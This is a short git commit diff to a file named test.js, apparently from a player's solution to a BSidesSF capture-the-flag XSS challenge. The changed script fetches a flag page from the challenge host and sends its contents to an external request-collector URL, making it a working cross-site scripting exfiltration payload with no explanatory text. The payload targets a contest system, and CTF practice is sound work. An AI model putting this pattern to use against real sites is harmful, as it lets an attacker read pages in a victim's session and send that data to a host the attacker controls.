f4f431c69e1be36ded846fcea67d1ab9740873f1
zeropath1 <zeropath000@proton.me>
2026-03-21 02:27:31 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,3 +1,3 @@
-fetch('/xss-two-flag')
+fetch('https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag')
   .then(r => r.text())
   .then(flag => fetch('https://01km6qv1b7hc61p24fcxe2te0800-91e526c86e8930efdbd1.requestinspector.com/?flag=' + encodeURIComponent(flag)));
